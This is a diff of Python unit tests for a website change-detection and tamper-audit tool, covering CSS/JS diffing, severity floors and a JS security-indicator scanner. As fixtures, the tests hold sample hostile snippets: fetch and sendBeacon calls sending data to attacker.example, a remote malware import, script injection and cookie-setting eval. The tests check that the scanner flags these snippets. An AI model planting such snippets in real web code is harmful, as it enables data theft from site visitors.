@@ -732,6 +732,47 @@ def test_analyze_css_content_changes_still_catches_real_change(tmp_path):
     assert result["has_changes"] is True
 
 
+def test_parse_css_rules_indexed_preserves_duplicate_selectors():
+    """When a selector appears twice (common on real sites), the indexed
+    parser must keep BOTH occurrences. The legacy dict-based parser
+    silently overwrote the first with the second, causing the framework
+    to miss mutations that lived in an early occurrence.
+    Regression: site 14 of audit 01KRB5GSSM3J76H9Y2MPTZWPS4."""
+    css = (
+        "hr.green { border: solid #a2c241 1px !important; }\n"
+        "@font-face { font-family: 'x'; }\n"
+        "hr.green { visibility: visible; }\n"
+    )
+    indexed = assets.parse_css_rules_indexed(css)
+    assert "hr.green" in indexed
+    assert len(indexed["hr.green"]) == 2
+    assert indexed["hr.green"][0]["border"] == "solid #a2c241 1px !important"
+    assert indexed["hr.green"][1]["visibility"] == "visible"
+
+
+def test_analyze_css_content_changes_catches_duplicate_selector_mutation(
+    tmp_path,
+):
+    """If the first of two body rules changes color while the second stays
+    the same, the diff must still flag it."""
+    a = tmp_path / "a.css"
+    b = tmp_path / "b.css"
+    a.write_text(
+        "body { color: #ff0066; }\n"
+        "body { min-width: 300px; }\n"
+    )
+    b.write_text(
+        "body { color: #404040; }\n"
+        "body { min-width: 300px; }\n"
+    )
+    result = assets.analyze_css_content_changes(a, b, "screen.css")
+    assert result["has_changes"] is True
+    mods = [c for c in result["changes"] if c["type"] == "css_selector_modified"]
+    assert any(
+        c["selector"] == "body" and c["occurrence"] == 1 for c in mods
+    ), f"Expected body occurrence 1 modified; got {mods}"
+
+
 def test_analyze_js_content_changes_ignores_cdn_version_bump(tmp_path):
     """JS files referencing CDN-versioned URLs in string literals get the
     same treatment - common for analytics loaders / font loaders."""
@@ -741,6 +782,24 @@ def test_analyze_js_content_changes_ignores_cdn_version_bump(tmp_path):
     b.write_text('var url = "https://x/v333/track.js";\n')
     result = assets.analyze_js_content_changes(a, b, "loader.js")
     assert result["has_changes"] is False
+
+
+def test_analyze_new_file_media_binary_is_handled_without_utf8_decode(tmp_path):
+    """Binary media files are analyzed as bytes (size metadata), not text.
+
+    Regression guard: pre-fix `analyze_new_file(..., asset_type='media')`
+    called read_text(utf-8) and returned a decode error for ordinary
+    binary assets.
+    """
+    media = tmp_path / "logo.bin"
+    payload = b"\x89PNG\r\n\x1a\n\x00\x00\x00"
+    media.write_bytes(payload)
+
+    result = assets.analyze_new_file(media, "media", "added")
+
+    assert "error" not in result
+    assert result["change_type"] == "added"
+    assert result["file_size"] == len(payload)
 
 
 def test_normalize_volatile_urls_strips_trackerid():
@@ -1162,6 +1221,28 @@ def test_change_summary_no_changes_keeps_default_recommendation():
     assert result["recommendation"] == "No changes detected"
 
 
+def test_change_summary_media_only_change_requires_review():
+    """Media-only diffs should not collapse to severity=none.
+
+    Regression guard: pre-fix media changes toggled `changes_detected=True`
+    but never contributed to severity/impact/recommendations, so the summary
+    reported `requires_review=False`.
+    """
+    media = {"has_changes": True}
+    result = summary_mod.create_change_summary_json(
+        _empty_screenshot(),
+        _dom_no_changes(),
+        _empty_assets(),
+        _empty_assets(),
+        media,
+    )
+    assert result["overall_assessment"]["changes_detected"] is True
+    assert result["overall_assessment"]["change_severity"] == "medium"
+    assert result["overall_assessment"]["requires_review"] is True
+    assert "media" in result["affected_components"]
+    assert result["recommendation"] != "No changes detected"
+
+
 def test_change_summary_html_only_change_emits_html_recommendation():
     """Pre-fix any HTML-only change yielded `recommendation="No changes
     detected"` because the recommendations list only had visual/css/js
@@ -1450,3 +1531,336 @@ def test_compare_dom_no_dynamic_attribute_changes_for_identical(tmp_path):
     result = dom.compare_dom(a, b)
     assert result["has_changes"] is False
     assert result["dynamic_attributes"]["changes"] == []
+
+
+# ---------------------------------------------------------------------------
+# Report severity floor (security-indicator post-processing)
+# ---------------------------------------------------------------------------
+
+
+def test_minimum_severity_floors_for_attacker_domain():
+    """Any diff containing attacker.example must floor at CRITICAL."""
+    from test_ui.report.generator import _minimum_severity_from_structured_data
+
+    sd = {
+        "html_changes": {
+            "changes": [
+                {
+                    "type": "structure_detail",
+                    "code_snippet": '<script src="https://attacker.example/x.js">',
+                }
+            ]
+        }
+    }
+    assert _minimum_severity_from_structured_data(sd) == "CRITICAL"
+
+
+def test_minimum_severity_floors_for_csp_weakening():
+    """CSP meta-tag changes must floor at WARNING."""
+    from test_ui.report.generator import _minimum_severity_from_structured_data
+
+    sd = {
+        "html_changes": {
+            "changes": [
+                {
+                    "type": "attributes",
+                    "element": "meta[http-equiv:Content-Security-Policy]",
+                }
+            ]
+        }
+    }
+    assert _minimum_severity_from_structured_data(sd) == "WARNING"
+
+
+def test_minimum_severity_safe_for_benign_changes():
+    """Purely cosmetic diffs with no security indicators stay at SAFE."""
+    from test_ui.report.generator import _minimum_severity_from_structured_data
+
+    sd = {
+        "html_changes": {
+            "changes": [
+                {"type": "content", "description": "Heading text changed"}
+            ]
+        },
+        "css_changes": {"changes": [{"description": "Color changed to #f00"}]},
+    }
+    assert _minimum_severity_from_structured_data(sd) == "SAFE"
+
+
+# ---------------------------------------------------------------------------
+# CSS / JS changes JSON surfacing content_changes (post-audit-01KRC46...)
+# ---------------------------------------------------------------------------
+
+
+def test_create_css_changes_json_surfaces_security_relevant_content_changes():
+    """Per-rule CSS diffs with attacker domains must be visible to the AI."""
+    css_result = {
+        "has_changes": True,
+        "added": [],
+        "removed": [],
+        "changed": ["screen.css"],
+        "content_changes": [
+            {
+                "type": "css_selector_added",
+                "file": "screen.css",
+                "selector": "body::before",
+                "impact": "high",
+                "properties": {"content": "'PHISH-VIA-PSEUDO'"},
+            },
+            {
+                "type": "css_selector_added",
+                "file": "screen.css",
+                "selector": ".btn",
+                "impact": "low",
+                "properties": {"color": "#f00"},
+            },
+        ],
+    }
+    result = assets.create_css_changes_json(css_result)
+    selectors = [c.get("selector", "") for c in result["changes"]]
+    assert "body::before" in selectors
+    assert ".btn" not in selectors  # low-impact, non-security
+
+
+def test_create_css_changes_json_files_changed_includes_removed():
+    """`files_changed` should enumerate removed files too."""
+    css_result = {
+        "has_changes": True,
+        "added": ["new.css"],
+        "removed": ["old.css"],
+        "changed": ["main.css"],
+        "content_changes": [],
+    }
+    result = assets.create_css_changes_json(css_result)
+    assert result["files_changed"] == ["new.css", "main.css", "old.css"]
+
+
+def test_create_js_changes_json_filters_noise_and_surfaces_security():
+    """Minified boundary-drift noise is filtered; security vectors surface."""
+    js_result = {
+        "has_changes": True,
+        "added": [],
+        "removed": [],
+        "changed": ["matomo.js"],
+        "content_changes": [
+            {
+                "type": "js_function_added",
+                "file": "matomo.js",
+                "function_name": "__afrTamperMarker",
+                "impact": "high",
+                "code_snippet": 'function __afrTamperMarker() { return "test"; }',
+            },
+            {
+                "type": "js_function_modified",
+                "file": "matomo.js",
+                "function_name": "N",
+                "impact": "high",
+                "code_snippet": "function N() {var au=typeof console;}",
+            },
+            {
+                "type": "js_function_modified",
+                "file": "matomo.js",
+                "function_name": "N",  # duplicate name → noise
+                "impact": "high",
+                "code_snippet": "function N() {var av=typeof console;}",
+            },
+        ],
+    }
+    result = assets.create_js_changes_json(js_result)
+    names = [c.get("function_name", "") for c in result["changes"]]
+    assert "__afrTamperMarker" in names
+    # Duplicate "N" should be deduplicated.
+    assert names.count("N") == 1
+
+
+def test_create_js_changes_json_surfaces_attacker_domain_in_snippet():
+    """A JS function containing attacker.example must surface even if impact=low."""
+    js_result = {
+        "has_changes": True,
+        "added": [],
+        "removed": [],
+        "changed": ["app.js"],
+        "content_changes": [
+            {
+                "type": "js_function_added",
+                "file": "app.js",
+                "function_name": "exfil",
+                "impact": "low",
+                "code_snippet": "fetch('https://attacker.example/steal')",
+            }
+        ],
+    }
+    result = assets.create_js_changes_json(js_result)
+    names = [c.get("function_name", "") for c in result["changes"]]
+    assert "exfil" in names
+
+
+def test_create_js_changes_json_files_changed_includes_removed():
+    """`files_changed` should enumerate removed JS files too."""
+    js_result = {
+        "has_changes": True,
+        "added": ["new.js"],
+        "removed": ["legacy.js"],
+        "changed": ["app.js"],
+        "content_changes": [],
+        "detailed_analysis": {},
+    }
+    result = assets.create_js_changes_json(js_result)
+    assert result["files_changed"] == ["new.js", "app.js", "legacy.js"]
+
+
+# ---------------------------------------------------------------------------
+# Report generator timeout fallback
+# ---------------------------------------------------------------------------
+
+
+def test_timeout_fallback_synthesizes_severity_from_structured_data():
+    """When AI returns a timeout error, the generator must synthesize a
+    severity based on the structured diff data rather than persisting a
+    raw error envelope."""
+    from test_ui.report.generator import _synthesize_timeout_response
+
+    sd = {
+        "html_changes": {
+            "changes": [
+                {
+                    "type": "structure_detail",
+                    "code_snippet": '<script src="https://attacker.example/x.js">',
+                }
+            ]
+        }
+    }
+    response = _synthesize_timeout_response(
+        request_id="req-123", structured_data=sd
+    )
+    assert response["result_type"] == "analysis_success"
+    assert response["overall_severity"] == "CRITICAL"
+    assert response["business_impact"] == "HIGH"
+    assert response["model"] == "synthetic_timeout_fallback"
+
+
+# ---------------------------------------------------------------------------
+# JS security indicator scanning (post-audit-01KRC46BJQFBSQ4Z6Y2R1EYEVZ)
+# ---------------------------------------------------------------------------
+
+
+def test_scan_js_security_indicators_catches_eval():
+    """Appended eval() must be caught even when outside any function."""
+    code = 'console.log("ok"); eval("document.cookie=\"pwned\"");'
+    found = assets._scan_js_security_indicators(code)
+    assert any("eval(" in f for f in found)
+
+
+def test_scan_js_security_indicators_catches_document_write():
+    """Appended document.write() must surface."""
+    code = 'document.write("<script src=//attacker.example></script>");'
+    found = assets._scan_js_security_indicators(code)
+    assert any("document.write" in f for f in found)
+
+
+def test_scan_js_security_indicators_catches_sendbeacon():
+    """navigator.sendBeacon() exfiltration must surface."""
+    code = 'navigator.sendBeacon("https://attacker.example/log", data);'
+    found = assets._scan_js_security_indicators(code)
+    assert any("sendBeacon" in f for f in found)
+
+
+def test_scan_js_security_indicators_catches_dynamic_import():
+    """Dynamic import() of attacker domain must surface."""
+    code = 'import("https://attacker.example/malware.js");'
+    found = assets._scan_js_security_indicators(code)
+    assert any("import(" in f for f in found)
+
+
+def test_scan_js_security_indicators_caps_snippet_length():
+    """Snippets must be capped at 200 chars to avoid prompt bloat."""
+    long = "x" * 500
+    code = f'eval("{long}");'
+    found = assets._scan_js_security_indicators(code)
+    assert len(found) == 1
+    assert len(found[0]) <= 200
+    assert found[0].endswith("...")
+
+
+def test_analyze_js_content_changes_surfaces_security_indicators(tmp_path):
+    """Changed JS should include raw security indicators in analysis output."""
+    baseline = tmp_path / "baseline.js"
+    current = tmp_path / "current.js"
+    baseline.write_text("function ok() { return 1; }\n")
+    current.write_text('function ok() { return 1; }\n eval("alert(1)");\n')
+
+    result = assets.analyze_js_content_changes(baseline, current, "app.js")
+
+    assert result["has_changes"] is True
+    assert "error" not in result["analysis"]
+    added = result["analysis"]["security_indicators_added"]
+    assert any("eval(" in snippet for snippet in added)
+
+
+def test_create_js_changes_json_surfaces_security_indicators():
+    """Security indicators from detailed_analysis must appear in the AI-facing
+    changes list as security_indicator_added/removed records."""
+    js_result = {
+        "has_changes": True,
+        "added": [],
+        "removed": [],
+        "changed": ["app.js"],
+        "content_changes": [],
+        "detailed_analysis": {
+            "app.js": {
+                "security_indicators_added": [
+                    'eval("document.cookie=\\"pwned\\"");'
+                ],
+                "security_indicators_removed": [],
+            }
+        },
+    }
+    out = assets.create_js_changes_json(js_result)
+    indicator_changes = [
+        c for c in out["changes"] if c["change_type"] == "security_indicator_added"
+    ]
+    assert len(indicator_changes) == 1
+    assert indicator_changes[0]["file"] == "app.js"
+    assert "eval" in indicator_changes[0]["code_snippet"]
+    assert indicator_changes[0]["impact"] == "high"
+
+
+def test_create_js_changes_json_deduplicates_by_function_name():
+    """Minified boundary drift often emits the same function name many times.
+    The surfaced changes should only contain one entry per unique name."""
+    js_result = {
+        "has_changes": True,
+        "added": [],
+        "removed": [],
+        "changed": ["bundle.js"],
+        "content_changes": [
+            {
+                "type": "js_function_modified",
+                "file": "bundle.js",
+                "function_name": "a",
+                "impact": "high",
+                "code_snippet": "function a() { ... }",
+            },
+            {
+                "type": "js_function_modified",
+                "file": "bundle.js",
+                "function_name": "a",
+                "impact": "high",
+                "code_snippet": "function a() { ... }",
+            },
+            {
+                "type": "js_function_modified",
+                "file": "bundle.js",
+                "function_name": "b",
+                "impact": "high",
+                "code_snippet": "function b() { ... }",
+            },
+        ],
+    }
+    out = assets.create_js_changes_json(js_result)
+    fn_changes = [
+        c for c in out["changes"] if c["change_type"] == "function_modified"
+    ]
+    assert len(fn_changes) == 2
+    names = {c["function_name"] for c in fn_changes}
+    assert names == {"a", "b"}
